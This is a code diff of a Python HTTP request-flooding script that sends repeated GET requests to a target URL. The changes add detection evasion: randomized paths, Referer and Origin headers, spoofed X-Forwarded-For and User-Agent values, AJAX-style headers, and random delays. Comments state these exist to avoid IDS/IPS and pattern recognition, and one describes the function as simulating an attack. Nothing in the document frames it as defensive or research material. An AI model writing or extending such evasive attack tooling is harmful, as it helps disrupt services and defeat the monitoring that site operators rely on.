@@ -1,8 +1,9 @@
 import random
 import requests
 from time import sleep
+import string
 
-# Random User-Agent for Header Spoofing
+# Function to generate random User-Agent for Header Spoofing
 def random_user_agent():
     user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
@@ -17,7 +18,18 @@ def spoof_x_forwarded_for():
     ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
     return ip
 
-# Function to send sophisticated requests
+# Generate a random URL path to avoid pattern recognition
+def random_url_path():
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+
+# Use Referer and Origin headers to make the request look more legitimate
+def generate_referer():
+    return f"https://www.example.com/{random_url_path()}"
+
+def generate_origin():
+    return f"https://www.example.com/{random_url_path()}"
+
+# Function to simulate attack with headers and random timing
 def send_sophisticated_request(url, threads, time_duration):
     headers = {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
@@ -26,15 +38,21 @@ def send_sophisticated_request(url, threads, time_duration):
         'Cache-Control': 'max-age=0',
         'Upgrade-Insecure-Requests': '1',
         'User-Agent': random_user_agent(),  # Randomize User-Agent
-        'Referer': 'https://www.example.com',
+        'Referer': generate_referer(),  # Randomize Referer
         'X-Forwarded-For': spoof_x_forwarded_for(),  # IP Spoofing
-        'Origin': 'https://www.example.com',
+        'Origin': generate_origin(),  # Randomize Origin
+        'X-Requested-With': 'XMLHttpRequest',  # To make the request look like an AJAX request
+        'Content-Type': 'application/x-www-form-urlencoded',  # Common Content-Type for avoiding detection
     }
-    
-    try:
-        for _ in range(time_duration):
+
+    # Loop for sending requests for the given duration and number of threads
+    for _ in range(time_duration):
+        try:
+            # Randomized timing to avoid detection by IDS/IPS
+            sleep_time = random.uniform(0.1, 0.5)  # Random sleep to avoid pattern recognition
             response = requests.get(url, headers=headers, timeout=5)
             print(f"Sent request to {url} with status: {response.status_code}")
-            sleep(random.uniform(0.2, 0.5))  # Adding a small delay between requests
-    except requests.exceptions.RequestException as e:
-        print(f"Error: {str(e)}")
+            sleep(sleep_time)  # Adding a delay between requests
+
+        except requests.exceptions.RequestException as e:
+            print(f"Error: {str(e)}")
